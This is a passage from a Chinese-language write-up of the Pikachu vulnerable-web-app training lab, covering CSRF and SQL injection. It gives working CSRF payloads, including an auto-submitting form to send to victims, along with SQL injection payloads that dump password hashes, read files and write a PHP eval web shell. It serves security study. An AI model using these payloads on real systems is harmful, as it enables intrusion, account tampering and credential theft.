class="line">/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=%E7%94%B7&amp;phonenum=12345qq5&amp;add=123qq132&amp;email=1232131&amp;submit=submit</span><br></pre></td></tr></table></figure><p>构造如上Payload后，当用户使用同一个浏览器访问构造的URL后浏览器就会携带网站的Cookie，并自动提交表单中预设的个人信息，导致个人信息被修改。</p><p>如果觉得这个url过于明显，网上有很多短链接网站可以修饰url（百度搜索“短链接”就有很多）<br><img src="/CTF/25.png"></p><h2 id="CSRF（POST）"><a href="#CSRF（POST）" class="headerlink" title="CSRF（POST）"></a>CSRF（POST）</h2><h3 id="防御方式-15"><a href="#防御方式-15" class="headerlink" title="防御方式"></a>防御方式</h3><p>无</p><h3 id="漏洞利用-15"><a href="#漏洞利用-15" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>与GET提交类似，通过抓包可以看到POST提交的输入如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sex=%E7%94%B7&amp;phonenum=123&amp;add=456&amp;email=789&amp;submit=submit</span><br></pre></td></tr></table></figure><p>构造如下Payload后，当用户使用同一个浏览器访问构造的URL后浏览器就会携带网站的Cookie，并自动提交表单中预设的个人信息，导致个人信息被修改</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;postsubmit&quot;</span>).<span class="title function_">click</span>();</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost/pikachu-master/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;giao&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123654789&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;add&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;giao&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;giao&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在攻击者的电脑cmd命令开启http服务<br>python -m http.server 80<br>创建文件post.html放在桌面，写入payload，在桌面打开cmd，输入python -m http.server 80<br>然后将链接：<a href="http://localhost:8000/post.html%E5%8F%91%E9%80%81%E7%BB%99%E8%A2%AB%E6%94%BB%E5%87%BB%E8%80%85%EF%BC%8C%E8%A2%AB%E6%94%BB%E5%87%BB%E8%80%85%E6%89%93%E5%BC%80%E9%93%BE%E6%8E%A5%EF%BC%8C%E4%BF%A1%E6%81%AF%E5%B0%B1%E4%BC%9A%E8%A2%AB%E4%BF%AE%E6%94%B9%E3%80%82">http://localhost:8000/post.html发送给被攻击者，被攻击者打开链接，信息就会被修改。</a><br><img src="/CTF/26.png"></p><h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h2><h3 id="防御方式-16"><a href="#防御方式-16" class="headerlink" title="防御方式"></a>防御方式</h3><p>当修改信息时需要校验网页中的token信息，token信息都时随机生成的，且每次修改资料token值都会发生改变，该机制暂时无法绕过(无法知晓前端Token值)</p><h3 id="漏洞利用-16"><a href="#漏洞利用-16" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>暂无<br><img src="/CTF/27.png"><br>试了一下，这关删除token是无法修改用户信息的，多抓几个包之后也没有看出token有什么规律。</p><p>在一个浏览器上以lucy登录，到修改信息的页面，查看网页源代码获取token，再到另一个浏览器以lili登录，构造payload包含此token也是无法攻击成功的。</p><p>看一下代码，修改用户信息时，服务器会比较url中的token字段和session中的token字段，如果相同才能修改用户信息。</p><p>修改完用户信息之后，会用set_token()函数生成新的token，将其返回到html表单中并隐藏起来，以便下次用户修改信息时代入url。<br><img src="/CTF/28.png"><br><img src="/CTF/29.png"><br>set_token()函数如下图所示，在生成新token之前会先销毁老token，避免token重复使用。<br><img src="/CTF/30.png"></p><h1 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL-Inject"></a>SQL-Inject</h1><h2 id="注入常用套路"><a href="#注入常用套路" class="headerlink" title="注入常用套路"></a>注入常用套路</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 判断注入</span><br><span class="line"></span><br><span class="line">?id=1&#x27;      # 返回异常可能存在注入</span><br><span class="line">?id=1&#x27;#     # 井号注释掉后面的sql语句，返回正常可能存在注入(#需要转成%23)</span><br><span class="line">?id=1&#x27;--    # --注释掉后面的sql语句，在url时(GET请求)中得改成--+，返回正常可能存在注入</span><br><span class="line">?id=1 and 1=1   # 返回正常可能存在注入</span><br><span class="line">?id=1 and 1=2   # 返回异常可能存在注入</span><br><span class="line">?id=1 or 1=1    # 返回正常可能存在注入</span><br><span class="line">?id=1 and select sleep(5)   # 网页加载时间比平时慢5秒可能存在注入</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 猜字段数量</span><br><span class="line"></span><br><span class="line">?id=1&#x27; order by 1#      # 调整数字大小，在正常与异常的临界点则为字段数量</span><br><span class="line">?id=1&quot; order by 1#</span><br><span class="line">?id=1 order by 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查询数据库名</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,2,database()#</span><br><span class="line">?id=1&quot; union select 1,2,database()#</span><br><span class="line">?id=1 union select 1,2,database()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查表名</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,TABLE_NAME,3 from information_schema.COLUMNS where TABLE_SCHEMA=database()#</span><br><span class="line">?id=1 union select 1,TABLE_NAME,3 from information_schema.COLUMNS where TABLE_SCHEMA=database()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查字段名</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=database()#        # 猜所有表的字段</span><br><span class="line">?id=1 union select 1,COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=database()</span><br><span class="line">?id=1&#x27; union select 1,COLUMN_NAME FROM information_schema.columns where TABLE_NAME=&#x27;users&#x27;#     # 单独查询某个表的字段</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查字段内容</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 字段1,字段2，字段3 from 表名#</span><br><span class="line">?id=1 union select 字段1,字段2，字段3 from 表名</span><br><span class="line">?id=1 union select 1,group_concat(字段名) from 表名      # 一般查询是一列输出的，group_concat()是拼接为一行输出的</span><br><span class="line">?id=1 union select 1,group_concat(字段名) from 库名.表名</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 读文件</span><br><span class="line">select load_file(&#x27;/flag.txt&#x27;)                   # 直接在数据库中执行</span><br><span class="line">?id=1 union select 1,load_file(&#x27;/flag.txt&#x27;)      # 联合查询读文件</span><br><span class="line">?id=1 union select 1,load_file(0x2f666c61672e747874)        # 如果过滤的是&#x27;或者是&quot;时 使用十六进制对其进行编码</span><br><span class="line"></span><br><span class="line"># 写文件</span><br><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;/var/www/html/1.php&#x27;;     # 直接在数据库中执行</span><br><span class="line">?id=1 union select &#x27;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;&#x27; into outfile &#x27;/var/www/html/1.php&#x27;;</span><br><span class="line">?id=1 union select &#x27;&lt;?php @eval(\$_POST[&quot;a&quot;]);?&gt;&#x27; into outfile &#x27;/var/www/html/1.php&#x27;; # 在一定条件下需要使用\把$注释掉</span><br><span class="line"></span><br><span class="line">select 0x3c3f70687020406576616c28245f504f53545b2261225d293b3f3e into outfile &#x27;/var/www/html/1.php&#x27;; # 将一句话马转为16进制</span><br></pre></td></tr></table></figure><h2 id="盲注常用函数"><a href="#盲注常用函数" class="headerlink" title="盲注常用函数"></a>盲注常用函数</h2><p><code>length()</code> 返回字符串的长度</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法: length(查询到的数据)</span><br><span class="line">示例: (当前数据库名为dvwa)</span><br><span class="line"></span><br><span class="line">select length(database());      # 查询当前数据库名的长度</span><br><span class="line"></span><br><span class="line">mysql&gt; select length(database())&gt;2; # 查询当前数据库名的长度是否大于2，正确返回1，错误返回0</span><br><span class="line">+----------------------+</span><br><span class="line">| length(database())&gt;2 |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    1 |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure><p><code>substr()</code>截取字符串</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法: substr(字符串,起始位置,截取长度)</span><br><span class="line">示例: (当前数据库名为dvwa)</span><br><span class="line"></span><br><span class="line">select substr(database(),1,1);  # 查询当前数据库名的第一个字符，返回 d</span><br><span class="line">select substr(database(),2,1);  # 查询当前数据库名的第一个字符，返回 v</span><br><span class="line">select substr(database(),1,2);  # 查询当前数据库名的前两个字符，返回 dv</span><br><span class="line"></span><br><span class="line">mysql&gt; select substr(database(),1,2);</span><br><span class="line">  +------------------------+</span><br><span class="line">  | substr(database(),1,2) |</span><br><span class="line">  +------------------------+</span><br><span class="line">  | dv                     |</span><br><span class="line">  +------------------------+</span><br></pre></td></tr></table></figure><p><code>ascii()</code>返回字符的Ascii码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法: ascii(单个字符)</span><br><span class="line">示例: (当前数据库名为dvwa)</span><br><span class="line"></span><br><span class="line">select ascii(&#x27;a&#x27;);      # 查询字符a的ascii码，返回97</span><br><span class="line">select ascii(substr(database(),1,1));       # 查询当前数据库名第一个字符的ascii码，返回100对应的字符为d</span><br><span class="line">select ascii(substr(database(),2,1));       # 查询当前数据库名第二个字符的ascii码，返回118对应的字符为v</span><br><span class="line"></span><br><span class="line">mysql&gt; select ascii(substr(database(),2,1));</span><br><span class="line">  +-------------------------------+</span><br><span class="line">  | ascii(substr(database(),2,1)) |</span><br><span class="line">  +-------------------------------+</span><br><span class="line">  |                           118 |</span><br><span class="line">  +-------------------------------+</span><br></pre></td></tr></table></figure><p><code>sleep()</code> 延时函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法: sleep(延时时间)</span><br><span class="line">示例:</span><br><span class="line">select sleep(2)     # 延时2秒</span><br><span class="line"></span><br><span class="line">mysql&gt; select sleep(2);</span><br><span class="line">  +----------+</span><br><span class="line">  | sleep(2) |</span><br><span class="line">  +----------+</span><br><span class="line">  |        0 |</span><br><span class="line">  +----------+</span><br><span class="line">  1 row in set (2.00 sec)       # 执行时间</span><br></pre></td></tr></table></figure><p><code>if()</code> 条件函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法: if(语句1,语句2，语句3)</span><br><span class="line">示例:</span><br><span class="line"></span><br><span class="line">如果语句1执行正确则接着执行语句2，如果执行错误则执行语句3</span><br><span class="line">select if(1=1,&#x27;yes&#x27;,&#x27;no&#x27;);      # 如果1=1成立则返回yes，不成立则返回no</span><br><span class="line">select if(1=1,sleep(2),&#x27;no&#x27;);    # 如果1=1成立则延时2秒，不成立则返回no</span><br><span class="line">select if(substr(database(),1,1)=&#x27;d&#x27;,&quot;yes&quot;,&quot;no&quot;);       # 当前数据库名第一个字符为d则返回yes</span><br><span class="line">select if(ascii(substr(database(),1,1))=100,&quot;yes&quot;,&quot;no&quot;); # 当前数据库名第一个字符的ascii码为100则返回yes</span><br><span class="line"></span><br><span class="line">mysql&gt; select if(length(database())&gt;2,&quot;yes&quot;,&quot;no&quot;);  # 当前数据库名长度大于2的话则返回yes</span><br><span class="line">  +-------------------------------------+</span><br><span class="line">  | if(length(database())&gt;2,&quot;yes&quot;,&quot;no&quot;) |</span><br><span class="line">  +-------------------------------------+</span><br><span class="line">  | yes                                 |</span><br><span class="line">  +-------------------------------------+</span><br></pre></td></tr></table></figure><p><code>limit</code> 限制查询条数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 当猜表名时有多个表（substr函数一次只能处理一个字符串），需要用到limit 来限制一次只能输出一个表(一个字符串)</span><br><span class="line"># (limit索引从0开始)</span><br><span class="line"></span><br><span class="line">语法: limit 其起始,输出个数</span><br><span class="line">示例:</span><br><span class="line"></span><br><span class="line">users表下的user_id字段有内容: 1,2,3,4,5</span><br><span class="line">select user_id from users limit 0,1     # 从第1个内容开始查询，返回一条数据，结果为1</span><br><span class="line">select user_id from users limit 1       # 同上(起始位置默认为0)</span><br><span class="line">select user_id from users limit 1,1     # 从第2个内容开始查询，返回一条数据，结果为2</span><br><span class="line">select user_id from users limit 0,2     # 从第1个内容开始查询，返回两条数据，结果为12</span><br><span class="line"></span><br><span class="line"># 查询当前数据库的第一个数据表表名长度</span><br><span class="line">mysql&gt; select length((select table_name from information_schema.tables where table_schema=database() limit 0,1));</span><br><span class="line">+----------------------------------------------------------------------------------------------------+</span><br><span class="line">| length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) |</span><br><span class="line">+----------------------------------------------------------------------------------------------------+</span><br><span class="line">|                                                                                                  9 |</span><br><span class="line">+----------------------------------------------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line"># 查询当前数据库的第二个数据表表名长度</span><br><span class="line">mysql&gt; select length((select table_name from information_schema.tables where table_schema=database() limit 1,1));</span><br><span class="line">+----------------------------------------------------------------------------------------------------+</span><br><span class="line">| length((select table_name from information_schema.tables where table_schema=database() limit 1,1)) |</span><br><span class="line">+----------------------------------------------------------------------------------------------------+</span><br><span class="line">|                                                                                                  5 |</span><br><span class="line">+----------------------------------------------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line"># 查询当前数据库的第一个数据表的第一个字符的内容</span><br><span class="line">mysql&gt; select substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1);</span><br><span class="line">+--------------------------------------------------------------------------------------------------------+</span><br><span class="line">| substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1) |</span><br><span class="line">+--------------------------------------------------------------------------------------------------------+</span><br><span class="line">| g                                                                                                      |</span><br><span class="line">+--------------------------------------------------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 不使用limit限制查询时</span><br><span class="line">mysql&gt; select substr((select table_name from information_schema.tables where table_schema=database()),1,1);</span><br><span class="line">ERROR 1242 (21000): Subquery returns more than 1 row        # 报错子查询超过一行</span><br></pre></td></tr></table></figure><p><code>count()</code> 返回查询数量</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法: count(查询到的数据)</span><br><span class="line">示例:</span><br><span class="line"></span><br><span class="line">users表下的user_id字段有内容: 1,2,3,4,5</span><br><span class="line">select count((select user_id from users));      # 查询users表下的user_id字段有几个内容，返回5</span><br><span class="line">select count(schema_name) from information_schema.schemata;     # 查询数据库个数</span><br><span class="line">select count(table_name) from information_schema.tables where table_schema=&#x27;库名&#x27;;        # 查询指定数据库的表个数</span><br><span class="line">select count(column_name) from information_schema.columns where table_schema=&#x27;库名&#x27; and table_name=&#x27;表名&#x27;;  # 查询指定库下表的字段个数</span><br><span class="line">select count(字段名) from 库名.表名        # 查询指定库-&gt;表-&gt;字段 下的内容个数</span><br><span class="line"></span><br><span class="line">mysql&gt; select count(schema_name) from information_schema.schemata;</span><br><span class="line">+--------------------+</span><br><span class="line">| count(schema_name) |</span><br><span class="line">+--------------------+</span><br><span class="line">|                 10 |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p><code>group_concat()</code> 成组返回</p><h2 id="数字型注入（post）"><a href="#数字型注入（post）" class="headerlink" title="数字型注入（post）"></a>数字型注入（post）</h2><h3 id="防御方式-17"><a href="#防御方式-17" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对Sql注入无任何防护</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select username,email from member where id=<span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用-17"><a href="#漏洞利用-17" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>判断注入类型</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;       # 异常(You have an error in your SQL syntax; )</span><br><span class="line">id=1#       # 正常</span><br><span class="line">id=1 and 1=1    # 正常</span><br><span class="line">id=1 and 1=2    # 异常(您输入的user id不存在，请重新输入！)</span><br><span class="line"></span><br><span class="line">// 该注入类型为数字型注入</span><br></pre></td></tr></table></figure><h3 id="猜字段数"><a href="#猜字段数" class="headerlink" title="猜字段数"></a>猜字段数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 order by 2     # 正常</span><br><span class="line">id=1 order by 3     # 异常(Unknown column &#x27;3&#x27; in &#x27;order clause&#x27;)</span><br><span class="line"></span><br><span class="line">// 共有两个字段</span><br></pre></td></tr></table></figure><h3 id="查询数据库名"><a href="#查询数据库名" class="headerlink" title="查询数据库名"></a>查询数据库名</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>返回数据库名为pikachu</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span>语句如下</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> username,email <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database();</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+---------+</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> email   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>        <span class="operator">|</span> pikachu <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+---------+</span></span><br></pre></td></tr></table></figure><h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>返回表名有 httpinfo,<span class="keyword">member</span>,message,users,xssblind</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span>语句如下</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> username,email <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> email                                  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>        <span class="operator">|</span> httpinfo,<span class="keyword">member</span>,message,users,xssblind <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------------------------------------+</span></span><br><span class="line"></span><br><span class="line">### 查询字段名</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">users表</span><br><span class="line">id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>该表下有字段id,username,password,level</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span>语句如下</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> username,email <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------------------------+</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> email                      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>        <span class="operator">|</span> id,username,password,level <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------------------------+</span></span><br></pre></td></tr></table></figure><h3 id="查询内容"><a href="#查询内容" class="headerlink" title="查询内容"></a>查询内容</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">users表下的username，password字段内容</span><br><span class="line">id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(username),group_concat(password) <span class="keyword">from</span> users</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span>语句如下</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> username,email <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(username),group_concat(password) <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+----------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> username           <span class="operator">|</span> email                                                                                              <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+----------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> admin,pikachu,test <span class="operator">|</span> e10adc3949ba59abbe56e057f20f883e,<span class="number">670</span>b14728ad9902aecba32e22fa4f6bd,e99a18c428cb38d5f260853678922e03 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+----------------------------------------------------------------------------------------------------+</span></span><br></pre></td></tr></table></figure><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><h3 id="防御方式-18"><a href="#防御方式-18" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对SQL注入无任何防护</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select id,email from member where username=&#x27;<span class="subst">$name</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="漏洞利用-18"><a href="#漏洞利用-18" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>判断注入类型</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=vince&#x27;        # 返回异常</span><br><span class="line">?name=vince&quot;        # 返回正常</span><br><span class="line">?name=vince&#x27;%23     # 返回正常</span><br><span class="line">?name=vince&#x27; and &#x27;1&#x27;=&#x27;1     # 返回正常</span><br><span class="line">?name=vince&#x27; and &#x27;1&#x27;=&#x27;2     # 返回异常</span><br><span class="line"></span><br><span class="line">//该注入类型为字符型，且闭合符号为 &#x27;</span><br></pre></td></tr></table></figure><p>将数字型的Payload变形一下就可以</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 猜字段数</span><br><span class="line">?name=vince&#x27; order by 2%23</span><br><span class="line"></span><br><span class="line"># 查询数据库名</span><br><span class="line">?name=vince&#x27; union select 1,database()%23</span><br><span class="line"></span><br><span class="line"># 查询表名</span><br><span class="line">?name=vince&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br><span class="line"></span><br><span class="line"># 查询字段名</span><br><span class="line">?name=vince&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;%23</span><br><span class="line"></span><br><span class="line"># 查询字段内容</span><br><span class="line">?name=vince&#x27; union select group_concat(username),group_concat(password) from users%23</span><br></pre></td></tr></table></figure><h2 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h2><h3 id="防御方式-19"><a href="#防御方式-19" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对SQL注入无任何防护</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select username,id,email from member where username like &#x27;%<span class="subst">$name</span>%&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><p>漏洞利用</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> xx,xx,xx <span class="keyword">from</span> xx <span class="keyword">where</span> xxx <span class="keyword">like</span> <span class="string">&#x27;%输入的值%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>继续判断该级别的SQL闭合符号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=a%&quot;%23        # 搜索异常</span><br><span class="line">?name=a%&#x27;%23        # 搜索正常</span><br><span class="line">?name=%&#x27;%23         # 搜索异常(所有用户信息全部出现)</span><br><span class="line">?name=a%&#x27;)%23       # 异常</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//可以确定该查询的闭合为 &#x27;%xx%&#x27;</span><br></pre></td></tr></table></figure><p>Payload如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 猜字段数</span><br><span class="line">?name=a%&#x27; order by 3%23</span><br><span class="line"></span><br><span class="line"># 查询数据库名(为了方便观察，把查询的字符改成其他)</span><br><span class="line">?name=1%&#x27; union select 1,2,database()%23</span><br><span class="line"></span><br><span class="line"># 查询表名</span><br><span class="line">?name=1%&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br><span class="line"></span><br><span class="line"># 查询字段名</span><br><span class="line">?name=1%&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;%23</span><br><span class="line"></span><br><span class="line"># 查询字段内容</span><br><span class="line">?name=1%&#x27; union select 1,group_concat(username),group_concat(password) from users%23</span><br></pre></td></tr></table></figure><h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><h3 id="防御方式-20"><a href="#防御方式-20" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对SQL注入无任何防护</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select id,email from member where username=(&#x27;<span class="subst">$name</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>漏洞利用<br>xx型不是一种注入类型，只是修改了上方的闭合符号而已</p><p>根据题目可以了解到大概的SQL语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> xxx,xxx,xxx <span class="keyword">from</span> xxx <span class="keyword">where</span> xxx<span class="operator">=</span><span class="string">&#x27;xx&#x27;</span>;</span><br></pre></td></tr></table></figure><p>继续判断该级别的SQL闭合符号</p><figure 